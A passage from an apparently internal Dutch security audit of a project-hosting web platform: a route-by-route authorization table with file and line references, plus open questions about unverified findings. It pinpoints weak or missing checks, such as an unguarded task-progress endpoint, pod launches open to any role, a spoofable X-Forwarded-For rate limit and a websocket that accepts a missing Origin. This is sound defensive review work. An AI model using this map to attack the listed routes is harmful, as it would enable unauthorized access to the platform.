| POST | `/projects/{project_name}/modal-wizard/{flow_id}/skip` | opi/web/router_detail_edit.py:1165 | sessie | lid/edit (router_detail_edit.py:1169-1172) | ok, zie B-4 |
| POST | `/projects/{project_name}/modal-wizard/{flow_id}/confirm` | opi/web/router_detail_edit.py:1183 | sessie | lid/edit (1187-1190) + edit hercontrole in _modal_do_submit:1387 (niet voor backup/restore) | ok, zie B-4 |
| GET | `/projects/{project_name}/modal-wizard/modal-backup/select-deployment` | opi/web/router_detail_edit.py:1201 | sessie | projectlid (router_detail_edit.py:1208) | ok |
| GET | `/projects/{project_name}/modal-wizard/modal-restore/select-restore-mode` | opi/web/router_detail_edit.py:1229 | sessie | projectlid (router_detail_edit.py:1236) | ok |
| GET | `/projects/{project_name}/modal-wizard/progress/{task_id}` | opi/web/router_detail_edit.py:1678 | sessie | GEEN: geen lidmaatschap, geen task.project_name == pad (router_detail_edit.py:1678-1711) | ontbreekt (B-2) |
| GET | `/forms/wizard/restart` | opi/web/router_wizard.py:370 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| GET | `/forms/wizard/start` | opi/web/router_wizard.py:383 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| GET | `/forms/wizard/{flow_id}` | opi/web/router_wizard.py:405 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| GET | `/forms/wizard/{flow_id}/edit/{project_name}` | opi/web/router_wizard.py:526 | sessie | require_project_edit_access (router_wizard.py:538) | ok |
| GET | `/forms/wizard/{flow_id}/step/{section_id}` | opi/web/router_wizard.py:765 | sessie | GET: geen; POST: edit-hercontrole als state.project_name (router_wizard.py:875) | ok (sessie is cookie-gebonden) |
| POST | `/forms/wizard/{flow_id}/step/{section_id}` | opi/web/router_wizard.py:852 | sessie | GET: geen; POST: edit-hercontrole als state.project_name (router_wizard.py:875) | ok (sessie is cookie-gebonden) |
| POST | `/forms/wizard/{flow_id}/preset/{section_id}/{preset_id}` | opi/web/router_wizard.py:1115 | sessie | geen (alleen sessie-schrijf) | ok |
| GET | `/forms/wizard/help/{template_name:path}` | opi/web/router_wizard.py:1224 | sessie | geen; regex tegen traversal (router_wizard.py:1246) | onduidelijk (B-12) |
| GET | `/forms/wizard/{flow_id}/review` | opi/web/router_wizard.py:1541 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| POST | `/forms/wizard/{flow_id}/submit` | opi/web/router_wizard.py:2183 | sessie | _save_existing_project hercontroleert edit (router_wizard.py:2561); create: elke allowlist-gebruiker | ok |
| GET | `/admin/users` | opi/web/router_user_admin.py:103 | sessie | require_platform_admin (router_user_admin.py:107) | ok |
| GET | `/admin/users/create` | opi/web/router_user_admin.py:132 | sessie | require_platform_admin (:136/:150) | ok |
| POST | `/admin/users/create` | opi/web/router_user_admin.py:146 | sessie | require_platform_admin (:136/:150) | ok |
| GET | `/admin/users/{user_id}/edit` | opi/web/router_user_admin.py:200 | sessie | require_platform_admin (:204/:224) | ok |
| POST | `/admin/users/{user_id}/edit` | opi/web/router_user_admin.py:220 | sessie | require_platform_admin (:204/:224) | ok |
| POST | `/admin/users/{user_id}/delete` | opi/web/router_user_admin.py:287 | sessie | require_platform_admin (:291) | ok |
| GET | `/admin/usage` | opi/web/router_usage.py:214 | sessie | require_platform_admin | ok |
| GET | `/admin/diensten` | opi/web/router_shared_services.py:39 | sessie | require_platform_admin | ok |
| GET | `/admin/diensten/resources` | opi/web/router_shared_services.py:58 | sessie | require_platform_admin | ok |
| GET | `/admin/diensten/opslag` | opi/web/router_shared_services.py:72 | sessie | require_platform_admin | ok |
| GET | `/admin/diensten/databases` | opi/web/router_shared_services.py:86 | sessie | require_platform_admin | ok |
| GET | `/admin/diensten/keycloak` | opi/web/router_shared_services.py:100 | sessie | require_platform_admin | ok |
| GET | `/admin/approvals` | opi/web/router_approvals.py:264 | sessie | require_platform_admin (router_approvals.py:269) | ok |
| GET | `/admin/approvals/{project_name}/modal-wizard/{flow_id}` | opi/web/router_approvals.py:314 | sessie | require_platform_admin (:318) | ok |
| POST | `/admin/approvals/{project_name}/modal-wizard/{flow_id}/step/{section_id}` | opi/web/router_approvals.py:361 | sessie | require_platform_admin (:368) | ok |
| POST | `/projects/{project_name}/attachments/{attachment_id}/delete` | opi/web/router_attachments.py:22 | sessie | require_project_edit_access (router_attachments.py:35) | ok |
| GET | `/forms/wizard/{flow_id}/attachments/list` | opi/web/router_wizard_attachments.py:190 | sessie | geen; sessie/token-gebonden (_resolve_state:67) | onduidelijk (B-10) |
| POST | `/forms/wizard/{flow_id}/attachments/stage` | opi/web/router_wizard_attachments.py:198 | sessie | geen; sessie/token-gebonden | onduidelijk (B-10) |
| POST | `/forms/wizard/{flow_id}/attachments/validate-id` | opi/web/router_wizard_attachments.py:264 | sessie | geen; sessie/token | onduidelijk (B-10) |
| POST | `/forms/wizard/{flow_id}/attachments/unstage/{attachment_id}` | opi/web/router_wizard_attachments.py:295 | sessie | geen; sessie/token | onduidelijk (B-10) |
| POST | `/forms/wizard/{flow_id}/attachments/remove-existing/{attachment_id}` | opi/web/router_wizard_attachments.py:322 | sessie | geen; save hercontroleert edit later | onduidelijk (B-10) |
| GET | `/projects/{project_name}/tasks` | opi/web/router_tasks.py:113 | sessie | _require_project_member_access (router_tasks.py:117) | ok |
| GET | `/projects/details/{project_name}/image-registries/status` | opi/services/catalog/image_registries/web.py:36 | sessie | projectlid (image_registries/web.py) | ok |
| GET | `/projects/details/{project_name}/backups` | opi/services/catalog/shared/backups.py:148 | sessie | projectlid (shared/backups.py) | ok |
| GET | `/projects/{project_name}/db-console/{deployment_name}/modal` | opi/services/catalog/shared/db_console.py:99 | sessie | _require_project_member_access (db_console.py:103) | ok, zie B-3 |
| GET | `/projects/{project_name}/db-console/{deployment_name}/status` | opi/services/catalog/shared/db_console.py:107 | sessie | _require_project_member_access (:111) | ok, zie B-3 |
| POST | `/projects/{project_name}/db-console` | opi/services/catalog/shared/db_console.py:115 | sessie | _require_project_member_access (:119): elke rol | zwak (B-3) |
| POST | `/projects/{project_name}/db-console/{session_id}/stop` | opi/services/catalog/shared/db_console.py:152 | sessie | _require_project_member_access (:156) | ok |
| GET | `/projects/{project_name}/jobs/{deployment_name}/modal` | opi/services/catalog/shared/jobs.py:97 | sessie | _require_project_member_access (jobs.py:101) | ok, zie B-3 |
| GET | `/projects/{project_name}/jobs/{deployment_name}/status` | opi/services/catalog/shared/jobs.py:105 | sessie | _require_project_member_access (jobs.py:109) | ok, zie B-3 |
| POST | `/projects/{project_name}/jobs` | opi/services/catalog/shared/jobs.py:113 | sessie | _require_project_member_access (jobs.py:117): elke rol mag pod met eigen image+command starten | zwak (B-3) |
| POST | `/projects/{project_name}/jobs/{session_id}/stop` | opi/services/catalog/shared/jobs.py:166 | sessie | _require_project_member_access (jobs.py:170); session_id opgezocht in eigen namespace | ok |
| GET | `/services/vlam/ca-bundle` | opi/services/catalog/vlam/routes.py:34 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| GET | `/eigen-domein` | opi/web/router.py:161 | geen | publiek (bewust, getest) | ok |
| GET | `/` | opi/web/router.py:170 | geen | redirect | ok |
| GET | `/introductie` | opi/web/router.py:196 | geen | publiek (bewust, getest) | ok |
| GET | `/permission-denied` | opi/web/router.py:221 | geen | publiek | ok |
| GET | `/projects/new` | opi/web/router.py:261 | geen | redirect naar wizard | ok |
| GET | `/subdomains/check` | opi/web/router_self_service.py:50 | sessie | ingelogd + rate limit (router_self_service.py:50) | ok |
| GET | `/projects/progress/{task_id}` | opi/web/router.py:294 | sessie | _require_task_access (router.py:3010): starter of projectlid | ok |
| GET | `/projects/progress/{task_id}/fragment` | opi/web/router.py:353 | sessie | _require_task_access (router.py:3010) | ok |
| POST | `/projects/delete/{project_name}` | opi/web/router.py:381 | sessie | inline projectlid + rol admin/owner (router.py:396-404) | ok |
| POST | `/projects/{project_name}/delete-deployment/{deployment_name}` | opi/web/router.py:419 | sessie | inline admin/owner (router.py:428-436) | ok |
| POST | `/projects/{project_name}/delete-component/{component_name}` | opi/web/router.py:454 | sessie | inline admin/owner (router.py:468-476) | ok |
| POST | `/projects/{project_name}/refresh` | opi/web/router.py:497 | sessie | inline admin/owner (router.py:507-515) | ok |
| POST | `/projects/{project_name}/refresh/{deployment_name}` | opi/web/router.py:531 | sessie | inline admin/owner (router.py:541-549) | ok |
| POST | `/projects/{project_name}/deployments/{deployment_name}/wake` | opi/web/router.py:592 | sessie | inline admin/owner (router.py:604-612) | ok |
| POST | `/projects/{project_name}/deployments/{deployment_name}/sleep` | opi/web/router.py:632 | sessie | inline admin/owner (router.py:643-651) | ok |
| GET | `/projects/{project_name}/deployments/{deployment_name}/actions/{action_key}/confirm` | opi/web/router.py:673 | sessie | inline admin/owner (router.py:693-701) | ok |
| GET | `/projects/{project_name}/actions/{action_key}/confirm` | opi/web/router.py:725 | sessie | inline admin/owner (router.py:741-749) | ok |
| GET | `/test-hero` | opi/web/router.py:772 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| GET | `/forms/formulier` | opi/web/router.py:791 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| GET | `/dashboard` | opi/web/router.py:1204 | sessie | lijst gefilterd op is_user_authorized_for_project (router.py:1228) | ok |
| GET | `/projects/{project_name}/taken` | opi/web/router.py:1372 | sessie | render_project_page: is_user_authorized_for_project (router.py:1507); rol alleen presentatie | ok, zie B-1 |
| GET | `/projects/{project_name}/backups` | opi/web/router.py:1372 | sessie | render_project_page: is_user_authorized_for_project (router.py:1507); rol alleen presentatie | ok, zie B-1 |
| GET | `/projects/{project_name}/metrics` | opi/web/router.py:1372 | sessie | render_project_page: is_user_authorized_for_project (router.py:1507); rol alleen presentatie | ok, zie B-1 |
| GET | `/projects/{project_name}/deployments` | opi/web/router.py:1372 | sessie | render_project_page: is_user_authorized_for_project (router.py:1507); rol alleen presentatie | ok, zie B-1 |
| GET | `/projects/{project_name}/services-info` | opi/web/router.py:1372 | sessie | render_project_page: is_user_authorized_for_project (router.py:1507); rol alleen presentatie | ok, zie B-1 |
| GET | `/projects/{project_name}/services` | opi/web/router.py:1372 | sessie | render_project_page: is_user_authorized_for_project (router.py:1507); rol alleen presentatie | ok, zie B-1 |
| GET | `/projects/{project_name}/componenten` | opi/web/router.py:1372 | sessie | render_project_page: is_user_authorized_for_project (router.py:1507); rol alleen presentatie | ok, zie B-1 |
| GET | `/projects/{project_name}/team` | opi/web/router.py:1372 | sessie | render_project_page: is_user_authorized_for_project (router.py:1507); rol alleen presentatie | ok, zie B-1 |
| GET | `/projects/{project_name}/details` | opi/web/router.py:1372 | sessie | render_project_page: is_user_authorized_for_project (router.py:1507); rol alleen presentatie | ok, zie B-1 |
| GET | `/projects/{project_name}/backups/{deployment_name}` | opi/web/router.py:1387 | sessie | render_project_page: is_user_authorized_for_project (router.py:1507); rol alleen presentatie | ok, zie B-1 |
| GET | `/projects/{project_name}/metrics/{deployment_name}` | opi/web/router.py:1387 | sessie | render_project_page: is_user_authorized_for_project (router.py:1507); rol alleen presentatie | ok, zie B-1 |
| GET | `/projects/{project_name}/deployments/{deployment_name}` | opi/web/router.py:1387 | sessie | render_project_page: is_user_authorized_for_project (router.py:1507); rol alleen presentatie | ok, zie B-1 |
| GET | `/projects/metrics/{project_name}/{deployment_name}` | opi/web/router.py:1434 | geen | blinde 302 naar nieuw pad, geen lookup (router.py:1445-1470) | ok |
| GET | `/projects/deployments/{project_name}/{deployment_name}` | opi/web/router.py:1434 | geen | blinde 302 naar nieuw pad, geen lookup (router.py:1445-1470) | ok |
| GET | `/projects/taken/{project_name}` | opi/web/router.py:1434 | geen | blinde 302 naar nieuw pad, geen lookup (router.py:1445-1470) | ok |
| GET | `/projects/metrics/{project_name}` | opi/web/router.py:1434 | geen | blinde 302 naar nieuw pad, geen lookup (router.py:1445-1470) | ok |
| GET | `/projects/deployments/{project_name}` | opi/web/router.py:1434 | geen | blinde 302 naar nieuw pad, geen lookup (router.py:1445-1470) | ok |
| GET | `/projects/services-info/{project_name}` | opi/web/router.py:1434 | geen | blinde 302 naar nieuw pad, geen lookup (router.py:1445-1470) | ok |
| GET | `/projects/services/{project_name}` | opi/web/router.py:1434 | geen | blinde 302 naar nieuw pad, geen lookup (router.py:1445-1470) | ok |
| GET | `/projects/componenten/{project_name}` | opi/web/router.py:1434 | geen | blinde 302 naar nieuw pad, geen lookup (router.py:1445-1470) | ok |
| GET | `/projects/team/{project_name}` | opi/web/router.py:1434 | geen | blinde 302 naar nieuw pad, geen lookup (router.py:1445-1470) | ok |
| GET | `/projects/details/{project_name}` | opi/web/router.py:1434 | geen | blinde 302 naar nieuw pad, geen lookup (router.py:1445-1470) | ok |
| GET | `/dashboard/resource-usage` | opi/web/router.py:2127 | sessie | gefilterd (router.py:2148) | ok |
| GET | `/projects/details/{project_name}/resource-usage` | opi/web/router.py:2198 | sessie | projectlid (router.py:2220) | ok |
| GET | `/projects/details/{project_name}/argocd-status/{deployment_name}` | opi/web/router.py:2301 | sessie | projectlid (router.py:2315) | ok |
| GET | `/projects/details/{project_name}/oom-status/{deployment_name}` | opi/web/router.py:2360 | sessie | projectlid (router.py:2387) | ok |
| GET | `/projects/details/{project_name}/metrics/{deployment_name}` | opi/web/router.py:2461 | sessie | projectlid (router.py:2485) | ok |
| GET | `/projects` | opi/web/router.py:2643 | sessie | _projects_for_user (router.py:2618) | ok |
| GET | `/cli` | opi/web/router.py:2687 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| GET | `/actions` | opi/web/router.py:2698 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| GET | `/account` | opi/web/router.py:2721 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| GET | `/weergave` | opi/web/router.py:2749 | geen | cookie + redirect, open-redirect guard | ok |
| GET | `/about` | opi/web/router.py:2775 | geen | publiek | ok |
| GET | `/test-template-variables` | opi/web/router.py:2799 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| GET | `/example` | opi/web/router.py:2824 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| GET | `/tools` | opi/web/router.py:2849 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| POST | `/tools/encrypt` | opi/web/router.py:2874 | sessie | ingelogd; eigen sleutel | ok |
| POST | `/tools/decrypt` | opi/web/router.py:2911 | sessie | ingelogd; eigen sleutel | ok |
| GET | `/projects/{project_name}/task-progress/{task_id}` | opi/web/router.py:3041 | sessie | _require_task_of_project + _require_task_access (router.py:3024) | ok |
| GET | `/lotc/` | opi/web/lotc_router.py:82 | geen | publiek: lege schil | ok |
| GET | `/lotc/pagina/{slug:path}` | opi/web/lotc_router.py:92 | geen | publiek: allowlist van voorbeeldpagina's (B-13) | zie bevinding |
| GET | `/lotc/formulier` | opi/web/lotc_router.py:114 | geen | publiek: voorbeeldformulier (B-13) | zie bevinding |
| GET | `/lotc/bg/{slug}` | opi/web/lotc_router.py:177 | geen | publiek: fixture-data (B-13) | zie bevinding |
| GET | `/static/lotc/{rel:path}` | opi/server.py:690 | geen | statisch | ok |
| MOUNT | `/static` | - | geen | statische bestanden | ok |
| GET | `/favicon.ico` | opi/server.py:708 | geen | statisch | ok |
| GET | `/.well-known/security.txt` | opi/server.py:715 | geen | publiek | ok |
| GET | `/healthz` | opi/server.py:723 | geen | probe | ok |
| GET | `/health` | opi/server.py:723 | geen | probe | ok |
| GET | `/version` | opi/server.py:730 | geen | publiek | ok |
| GET | `/readyz` | opi/server.py:738 | geen | probe | ok |

## Open vragen

1. B-4 is op functieniveau aangetoond (converter, mutation, normalisatie, `validate_service_configs`), niet over HTTP tegen een draaiende instantie. Een reproductie in de sandbox met een owner-sessie en een handgemaakte services-payload bevestigt of de UI-laag (json-enc.js, processor) de dict ongewijzigd doorlaat.
2. B-6: of er daadwerkelijk credentials in argv van kindprocessen staan hangt af van de connectors (git-URL met token, sops/age-argumenten). Niet nagelopen per connector.
3. Wat de db-console precies blootstelt (pgweb via port-forward of ingress, met welke credentials) is niet tot in de manifests gevolgd; de rolgrens (B-3) staat los daarvan vast.
4. De `restrict-access`-instelling onder de authorization-wall (geheugennotitie: deed niets) is in deze ronde niet opnieuw geverifieerd.
5. `GET /api/tasks/{task_id}` geeft `result` en `error_message` terug; of een taaktype daar secrets in zet is niet per taaktype geaudit.
6. De `/tools/decrypt`-route werkt met een door de gebruiker meegestuurde sleutel; niet nagegaan of de server-AGE-sleutel ooit als fallback wordt gebruikt.
7. Rate-limiter op de subdomein-check gebruikt het meest linkse XFF-adres (`router.py:154-160`) achter `ProxyHeadersMiddleware(trusted_hosts=["*"])` (`server.py:645`); of de ingress overschrijft of append bepaalt of dit te omzeilen is (geheugennotitie zegt: client-IP staat rechts).
8. Herkenning op de websocket accepteert een ontbrekende Origin (`logs_websocket_router.py:78`); niet-browserclients hebben dat nodig, maar het verdient een expliciete beslissing.
